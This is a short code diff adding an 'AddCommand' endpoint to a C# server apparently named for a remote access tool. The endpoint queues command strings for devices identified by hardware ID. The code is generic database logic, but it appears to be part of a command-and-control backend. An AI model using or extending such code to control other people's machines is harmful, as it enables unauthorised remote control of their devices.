@@ -143,5 +143,31 @@ namespace Rat_Server.Controllers
         }
 
         [HttpPost("AddCommand")]
+        public async Task<ActionResult<DeviceCommandDto>> AddCommand([FromBody] AddCommandDto addCommandDto)
+        {
+            Device? device = await _context.Devices.FirstOrDefaultAsync(d => d.Hwid.ToString().Equals(addCommandDto.Hwid));
+
+            if (device == null)
+            {
+                return BadRequest("Device not found");
+            }
+
+            Command command = new Command
+            {
+                Device = device,
+                DevicedHwid = device.Hwid,
+                CommandValue = addCommandDto.CommandValue
+            };
+
+            await _context.Commands.AddAsync(command);
+            await _context.SaveChangesAsync();
+
+            return new DeviceCommandDto
+            {
+                commandId = command.commandId.ToString(),
+                CommandValue = command.CommandValue,
+                Hwid = command.DevicedHwid.ToString()
+            };
+        }
     }
 }
